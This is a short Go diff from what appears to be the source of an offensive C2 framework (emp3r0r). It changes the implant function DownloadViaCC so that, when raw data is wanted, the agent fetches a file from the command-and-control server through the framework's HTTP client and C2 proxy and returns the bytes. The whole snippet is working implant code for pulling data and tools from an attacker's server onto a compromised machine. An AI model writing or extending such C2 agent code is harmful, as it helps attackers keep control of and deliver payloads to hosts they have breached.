@@ -66,7 +66,23 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 		os.Create(lock)
 	}
 
-	// use EmpHTTPClient
+	// use EmpHTTPClient if no path specified
+	if retData {
+		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+		resp, err := client.Get(url)
+		if err != nil {
+			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
+			return nil, err
+		}
+		data, err := io.ReadAll(resp.Body)
+		if err != nil {
+			err = fmt.Errorf("DownloadViaCC read body: %v", err)
+			return nil, err
+		}
+		return data, nil
+	}
+
+	// use grab
 	client := grab.NewClient()
 	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
 
@@ -76,9 +92,6 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 		return
 	}
 	resp := client.Do(req)
-	if retData {
-		return resp.Bytes()
-	}
 
 	// progress
 	t := time.NewTicker(10 * time.Second)
